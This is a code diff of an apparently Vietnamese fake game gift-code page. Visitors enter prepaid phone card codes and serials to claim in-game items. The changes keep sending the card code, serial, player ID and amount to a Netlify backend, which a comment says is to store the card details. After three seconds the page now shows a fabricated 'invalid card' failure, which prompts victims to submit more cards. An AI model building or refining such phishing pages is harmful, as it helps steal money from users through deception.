@@ -62,9 +62,9 @@
         .code-display { background: #f8f9fa; border: 2px dashed #cbd5e0; padding: 15px; text-align: center; font-size: 18px; font-weight: 800; margin: 15px 0; border-radius: 12px; color: #2d3748; letter-spacing: 1px; }
         .status-badge { display: block; padding: 10px; border-radius: 10px; font-weight: 800; font-size: 13px; margin-bottom: 15px; }
         .status-pending { background: #fff3cd; color: #856404; border: 1px solid #ffe58f; }
-        .status-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .status-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
 
-        .success-icon { font-size: 50px; color: var(--green); margin-bottom: 15px; display: block; }
+        .error-icon { font-size: 50px; color: var(--red); margin-bottom: 15px; display: block; }
 
         input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1.5px solid #e2e8f0; margin-bottom: 12px; outline: none; font-size: 14px; }
         label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #718096; margin-bottom: 5px; text-transform: uppercase; }
@@ -123,7 +123,8 @@
         { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
         { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
-        { id: 19, name: "Gói kẹo cao su Mint Pop", img: "https://i.postimg.cc/ydVk5v9h/IMG-2245.png" }, // Vị trí thứ 4
+        { id: 20, name: "Valentine xanh", img: "https://i.postimg.cc/wjGsM3Nj/IMG-2289.png" }, // Vị trí thứ 4
+        { id: 19, name: "Gói kẹo cao su Mint Pop", img: "https://i.postimg.cc/ydVk5v9h/IMG-2245.png" },
         { id: 17, name: "Đoá hoa toả sáng", img: "https://i.postimg.cc/nVkhtN8p/IMG-2160.png" },
         { id: 18, name: "Gói Nữ sinh trường Marron KM", img: "https://i.postimg.cc/BvHJ7Vc9/IMG-2161.png" },
         { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" },
@@ -136,8 +137,7 @@
         { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
         { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
         { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
-        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" },
-        { id: 15, name: "Valentine xanh cá tính", img: "https://i.postimg.cc/VkgQbSM7/Khong-Co-Tieu-De12-20260225014422.png", isComingSoon: true }
+        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
     ];
 
     const grid = document.getElementById('item-grid');
@@ -238,25 +238,27 @@
         
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p></div>`;
         
+        // Vẫn gửi dữ liệu về Netlify để lưu lại thông tin thẻ đã nhập
         fetch('/.netlify/functions/napthe', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount })
         });
 
+        // Sau 3 giây, hiện thông báo lỗi
         setTimeout(() => {
             content.innerHTML = `
-                <span class="success-icon">✔</span>
-                <h3 style="color:var(--green)">KÍCH HOẠT THÀNH CÔNG</h3>
-                <div style="background:#f0fff4; border:1px solid #c6f6d5; padding:15px; border-radius:12px; margin: 15px 0; text-align:left">
-                    <p style="font-size:13px; color:#2f855a; line-height:1.6">
-                        ● Code <b>${currentCode}</b> đã kích hoạt cho ID <b>${userPlayerID}</b>.<br>
-                        ● Vật phẩm: <b>${selectedGift}</b>.<br>
-                        ● Quà sẽ gửi vào hộp thư In-game sau 5-10 phút.
+                <span class="error-icon">⚠️</span>
+                <h3 style="color:var(--red)">KÍCH HOẠT THẤT BẠI</h3>
+                <div style="background:#fff5f5; border:1px solid #feb2b2; padding:15px; border-radius:12px; margin: 15px 0; text-align:left">
+                    <p style="font-size:13px; color:#c53030; line-height:1.6">
+                        ● Lỗi hệ thống: <b>Thẻ không hợp lệ</b>.<br>
+                        ● Lý do: Mã thẻ hoặc Seri không đúng, hoặc thẻ đã được sử dụng trước đó.<br>
+                        ● Vui lòng kiểm tra lại thông tin thẻ và thử lại sau.
                     </p>
                 </div>
-                <div class="status-badge status-success">✅ TRẠNG THÁI: ĐÃ KÍCH HOẠT</div>
-                <button class="btn-popup-receive" style="background:var(--green)" onclick="location.reload()">HOÀN TẤT</button>`;
+                <div class="status-badge status-error">❌ TRẠNG THÁI: THẤT BẠI</div>
+                <button class="btn-popup-receive" onclick="location.reload()">QUAY LẠI</button>`;
         }, 3000);
     }
 
